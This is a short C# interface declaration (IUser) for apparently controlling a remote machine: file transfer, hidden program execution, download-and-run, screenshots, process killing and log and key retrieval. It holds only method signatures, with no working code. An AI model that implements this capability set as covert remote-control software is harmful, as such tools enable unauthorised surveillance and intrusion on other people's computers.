using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;

namespace Interfaces.Users
{
    public interface IUser
    {
        void UploadDirectory(string dirPath, string uploadPath);
        List<string> GetLog();
        IInfoDevice GetInfoDevice();
        void DownloadFloader(string ftpPath, string localPath);
        void DownloadF(string FileName, string localPath);
        void DownloadUpdate();
        void Reconnect();
        void Disconnect();
        void RunHideProgram(string file);
        void DownloadAndRun(string file);
        void DeleteFile(string file);
        ISetting GetSetting();
        Bitmap ScreenShot();
        List<string> GetListProc();
        void KillProcess(string procName);
        string GetKey();
        IDirectoryInfo GetDirectoryFiles(string path, string searchPattern);
        List<string> GetDrives();
    }
}
